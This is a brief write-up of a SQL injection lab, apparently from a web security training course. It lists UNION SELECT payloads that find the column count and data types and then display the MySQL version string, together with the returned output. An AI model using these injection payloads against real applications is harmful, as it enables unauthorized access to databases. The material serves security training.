
Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

---

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

---

1/ Determine the number of columns

' UNION SELECT NULL--%20
' UNION SELECT NULL, NULL--%20


2/ Determine the data type of columns

' UNION SELECT 'AAA', 'AAA'--%20


3/ Determine the type and version of the database

' UNION SELECT NULL, @@version--%20
        8.0.42-0ubuntu0.20.04.1

# Or

' UNION SELECT NULL, @@version--+
        8.0.42-0ubuntu0.20.04.1

